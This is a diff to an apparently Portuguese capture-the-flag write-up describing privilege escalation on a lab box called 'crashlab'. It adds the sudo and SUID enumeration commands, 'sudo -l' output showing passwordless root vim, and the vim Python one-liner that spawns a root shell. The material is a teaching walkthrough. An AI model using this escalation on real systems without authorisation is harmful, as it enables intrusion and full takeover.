@@ -101,11 +101,24 @@
 
     Depois de pegar a flag do nosso user, partimos para o root...
 
-    Primeira coisa que pensei, procurar arquivos com permissão de sudo, ja que eu era um usuário diferente do www-data.
+    A primeira ideia para mim, é procurar por binários com permissões de sudo e conheço esses 2 comandos:
 
-    Vi que o vim podia ser executado com privilégios, então fui até o gtfobins
+    sudo -l #Check commands you can execute with sudo
+    find / -perm -4000 2>/dev/null #Find all SUID binaries
 
-    vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; ex
+    Executei o primeiro, "sudo -l", ja que eu estava logado com um usuário do sistema.
+
+    $ sudo -l
+    User demo may run the following commands on crashlab:
+        (root) NOPASSWD: /usr/bin/vim
+
+
+    O vim pode ser executado com o sudo sem senha, então...
+    Lets search an one line to spawn a root shell, go to gtfobins.
+
+    
+    vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
 
     Então conseguimos nossa shell
 
